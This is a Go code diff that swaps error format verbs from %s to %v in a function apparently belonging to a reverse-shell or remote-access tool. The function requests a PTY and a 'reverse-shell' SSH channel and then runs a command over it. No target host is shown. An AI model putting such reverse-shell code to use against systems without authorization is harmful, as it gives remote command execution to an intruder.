@@ -25,25 +25,25 @@ func (c *client) sendReverseShell(request *ssh.Request) {
 	// Request Server Term Size
 	_, payload, reqErr := c.sendConnRequest("window-size", true, nil)
 	if reqErr != nil {
-		c.Errorf("%s", reqErr)
+		c.Errorf("%v", reqErr)
 	}
 	var termSize interpreter.TermSize
 	if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
 		// If error term initializes with size 0 0
-		c.Errorf("%s", unMarshalErr)
+		c.Errorf("%v", unMarshalErr)
 	}
 
 	if c.interpreter.PtyOn {
 		// Notify server we will be sending a PTY
 		_, errSSHReq := channel.SendRequest("pty-req", true, nil)
 		if errSSHReq != nil {
-			c.Errorf("pty-req %s", errSSHReq)
+			c.Errorf("pty-req %v", errSSHReq)
 		}
 
 		// Notify server we will send a Reverse Shell
 		_, errSSHReq = channel.SendRequest("reverse-shell", true, nil)
 		if errSSHReq != nil {
-			c.Errorf("pty-req %s", errSSHReq)
+			c.Errorf("pty-req %v", errSSHReq)
 		}
 
 		c.ptyFile, _ = pty.StartWithSize(cmd, &pty.Winsize{
@@ -69,7 +69,7 @@ func (c *client) sendReverseShell(request *ssh.Request) {
 		// Notify server we will send a Reverse Shell
 		_, errSSHReq := channel.SendRequest("reverse-shell", true, nil)
 		if errSSHReq != nil {
-			c.Errorf("reverse-shell %s", errSSHReq)
+			c.Errorf("reverse-shell %v", errSSHReq)
 		}
 
 		pr, pw := io.Pipe()
@@ -91,7 +91,7 @@ func (c *client) sendReverseShell(request *ssh.Request) {
 		_ = c.replyConnRequest(request, true, []byte("shell-ready"))
 
 		if runErr := cmd.Run(); runErr != nil {
-			c.Errorf("failed to execute command error - %s", runErr)
+			c.Errorf("failed to execute command error - %v", runErr)
 		}
 	}
 }
